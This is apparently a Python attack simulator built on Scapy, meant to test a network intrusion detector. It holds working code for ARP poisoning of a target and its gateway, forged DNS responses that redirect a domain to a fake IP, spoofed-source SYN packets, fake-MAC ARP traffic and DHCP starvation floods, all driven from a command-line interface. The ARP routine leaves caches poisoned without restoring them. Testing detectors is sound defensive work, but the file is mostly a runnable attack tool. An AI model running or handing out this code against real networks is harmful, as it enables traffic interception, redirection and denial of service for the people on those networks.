#!/usr/bin/env python3
"""
Spoofing Attack Simulation - Tests detection of various spoofing techniques
For EDUCATIONAL and AUTHORIZED TESTING purposes only!
"""

import argparse
import time
import random
import socket
import struct

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Spoofing attacks require Scapy.")


class SpoofingAttacks:
    """Simulates various spoofing attack patterns for detection testing"""
    
    def __init__(self, target: str, gateway: str = None):
        self.target = target
        self.gateway = gateway or self._get_default_gateway()
        self.interface = conf.iface if SCAPY_AVAILABLE else None
        
    def _get_default_gateway(self) -> str:
        """Attempt to get default gateway"""
        try:
            if SCAPY_AVAILABLE:
                return conf.route.route("0.0.0.0")[2]
        except:
            pass
        return "192.168.1.1"  # Common default
    
    def _get_mac(self, ip: str) -> str:
        """Get MAC address for an IP"""
        if not SCAPY_AVAILABLE:
            return "ff:ff:ff:ff:ff:ff"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return "ff:ff:ff:ff:ff:ff"
    
    def arp_spoof(self, duration: int = 30) -> None:
        """
        ARP Spoofing/Poisoning - Sends fake ARP replies
        Detection: ARP replies without requests, MAC changes, gratuitous ARP floods
        Severity: CRITICAL
        """
        print(f"\n[*] Starting ARP Spoofing Attack")
        print(f"[*] Target: {self.target}, Gateway: {self.gateway}")
        print(f"[*] Duration: {duration}s")
        print("[*] Expected Detection: ARP_SPOOFING / ARP_POISONING")
        
        if not SCAPY_AVAILABLE:
            print("[!] ARP Spoofing requires Scapy")
            return
        
        # Get real MACs
        target_mac = self._get_mac(self.target)
        gateway_mac = self._get_mac(self.gateway)
        my_mac = get_if_hwaddr(self.interface)
        
        print(f"    [INFO] Target MAC: {target_mac}")
        print(f"    [INFO] Gateway MAC: {gateway_mac}")
        print(f"    [INFO] Attacker MAC: {my_mac}")
        
        start_time = time.time()
        packet_count = 0
        
        while (time.time() - start_time) < duration:
            try:
                # Tell target that we are the gateway
                pkt1 = ARP(op=2, pdst=self.target, hwdst=target_mac, psrc=self.gateway)
                # Tell gateway that we are the target
                pkt2 = ARP(op=2, pdst=self.gateway, hwdst=gateway_mac, psrc=self.target)
                
                send(pkt1, verbose=0)
                send(pkt2, verbose=0)
                packet_count += 2
                
                print(f"    [ARP SPOOF] Sent poison packets #{packet_count}")
                time.sleep(1)  # Send every second
                
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
        
        print(f"[+] ARP Spoofing complete - Sent {packet_count} packets")
        print("[*] Note: In real attack, would restore ARP tables here")
    
    def dns_spoof(self, domain: str = "example.com", fake_ip: str = "6.6.6.6", count: int = 50) -> None:
        """
        DNS Spoofing - Sends fake DNS responses
        Detection: Unsolicited DNS responses, mismatched DNS transaction IDs
        Severity: HIGH
        """
        print(f"\n[*] Starting DNS Spoofing Attack")
        print(f"[*] Domain: {domain} -> Fake IP: {fake_ip}")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: DNS_SPOOFING / DNS_POISONING")
        
        if not SCAPY_AVAILABLE:
            print("[!] DNS Spoofing requires Scapy")
            return
        
        packet_count = 0
        
        for _ in range(count):
            try:
                # Create fake DNS response
                dns_pkt = IP(dst=self.target, src="8.8.8.8")/UDP(dport=random.randint(1024, 65535), sport=53)/DNS(
                    id=random.randint(0, 65535),
                    qr=1,  # Response
                    aa=1,  # Authoritative
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, rdata=fake_ip, ttl=86400)
                )
                
                send(dns_pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [DNS SPOOF] Sent {packet_count} fake DNS responses...")
                    
                time.sleep(0.1)
                
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
        
        print(f"[+] DNS Spoofing complete - Sent {packet_count} packets")
    
    def ip_spoof(self, spoofed_ip: str = None, count: int = 100) -> None:
        """
        IP Spoofing - Sends packets with fake source IP
        Detection: Source IP from impossible ranges, geographic impossibilities
        Severity: HIGH
        """
        print(f"\n[*] Starting IP Spoofing Attack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: IP_SPOOFING / SPOOFED_SOURCE")
        
        if not SCAPY_AVAILABLE:
            print("[!] IP Spoofing requires Scapy")
            return
        
        packet_count = 0
        
        # Various spoofed IPs to test detection
        spoofed_ips = [
            "10.0.0.1",          # Private range
            "172.16.0.1",        # Private range
            "192.168.100.1",     # Private range
            "127.0.0.1",         # Loopback (impossible)
            "0.0.0.0",           # Null address
            "255.255.255.255",   # Broadcast
            "224.0.0.1",         # Multicast
            "1.2.3.4",           # Random public
        ]
        
        for _ in range(count):
            try:
                src_ip = spoofed_ip or random.choice(spoofed_ips)
                
                pkt = IP(src=src_ip, dst=self.target)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443, 22, 21, 23]),
                    flags="S"
                )
                
                send(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 20 == 0:
                    print(f"    [IP SPOOF] Sent {packet_count} spoofed packets...")
                    
                time.sleep(0.01)
                
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
        
        print(f"[+] IP Spoofing complete - Sent {packet_count} packets")
    
    def mac_spoof(self, count: int = 50) -> None:
        """
        MAC Spoofing - Sends packets with fake/known MAC addresses
        Detection: MAC address changes, impossible MAC vendors
        Severity: MEDIUM
        """
        print(f"\n[*] Starting MAC Spoofing Attack")
        print(f"[*] Count: {count} packets")
        print("[*] Expected Detection: MAC_SPOOFING / MAC_CHANGE")
        
        if not SCAPY_AVAILABLE:
            print("[!] MAC Spoofing requires Scapy")
            return
        
        # Various fake MACs to test
        fake_macs = [
            "00:00:00:00:00:00",     # Null MAC
            "ff:ff:ff:ff:ff:ff",     # Broadcast MAC
            "01:00:5e:00:00:01",     # Multicast
            "de:ad:be:ef:ca:fe",     # Common test MAC
            "00:11:22:33:44:55",     # Sequential
        ]
        
        packet_count = 0
        
        for _ in range(count):
            try:
                fake_mac = random.choice(fake_macs)
                
                pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=1,  # who-has
                    pdst=self.target,
                    hwsrc=fake_mac
                )
                
                sendp(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"    [MAC SPOOF] Sent {packet_count} packets with fake MACs...")
                    
                time.sleep(0.1)
                
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
        
        print(f"[+] MAC Spoofing complete - Sent {packet_count} packets")
    
    def dhcp_starvation(self, count: int = 100) -> None:
        """
        DHCP Starvation - Floods DHCP server with requests from fake MACs
        Detection: High rate of DHCP Discover from different MACs
        Severity: HIGH
        """
        print(f"\n[*] Starting DHCP Starvation Attack")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: DHCP_STARVATION / DHCP_FLOOD")
        
        if not SCAPY_AVAILABLE:
            print("[!] DHCP Starvation requires Scapy")
            return
        
        from scapy.layers.dhcp import DHCP, BOOTP
        
        packet_count = 0
        
        for _ in range(count):
            try:
                # Random MAC address
                fake_mac = RandMAC()
                
                # DHCP Discover
                pkt = Ether(src=str(fake_mac), dst="ff:ff:ff:ff:ff:ff")/\
                      IP(src="0.0.0.0", dst="255.255.255.255")/\
                      UDP(sport=68, dport=67)/\
                      BOOTP(chaddr=str(fake_mac))/\
                      DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(pkt, verbose=0)
                packet_count += 1
                
                if packet_count % 20 == 0:
                    print(f"    [DHCP STARVE] Sent {packet_count} DHCP Discovers...")
                    
                time.sleep(0.05)
                
            except Exception as e:
                print(f"    [!] Error: {e}")
                break
        
        print(f"[+] DHCP Starvation complete - Sent {packet_count} packets")


def main():
    parser = argparse.ArgumentParser(description="Spoofing Attack Simulator for Detection Testing")
    parser.add_argument("--target", "-t", default="192.168.1.1", help="Target IP address")
    parser.add_argument("--gateway", "-g", help="Gateway IP address")
    parser.add_argument("--type", "-T", default="arp",
                        choices=["arp", "dns", "ip", "mac", "dhcp", "all"],
                        help="Spoofing type")
    parser.add_argument("--duration", "-d", type=int, default=30, help="Attack duration")
    parser.add_argument("--domain", default="example.com", help="Domain for DNS spoof")
    parser.add_argument("--fake-ip", default="6.6.6.6", help="Fake IP for DNS spoof")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  SPOOFING ATTACK SIMULATOR - Detection Testing Tool")
    print("  ⚠️  WARNING: For authorized testing only!")
    print("=" * 60)
    print(f"  Target: {args.target}")
    print(f"  Attack Type: {args.type}")
    print("=" * 60)
    
    if not SCAPY_AVAILABLE:
        print("\n[!] Scapy is required for spoofing attacks!")
        print("[!] Install with: pip install scapy")
        return
    
    spoof = SpoofingAttacks(args.target, args.gateway)
    
    try:
        if args.type == "arp" or args.type == "all":
            spoof.arp_spoof(args.duration)
        if args.type == "dns" or args.type == "all":
            spoof.dns_spoof(args.domain, args.fake_ip)
        if args.type == "ip" or args.type == "all":
            spoof.ip_spoof()
        if args.type == "mac" or args.type == "all":
            spoof.mac_spoof()
        if args.type == "dhcp" or args.type == "all":
            spoof.dhcp_starvation()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print("\n[*] Attack simulation complete. Check PacketPeeper for detections!")


if __name__ == "__main__":
    main()
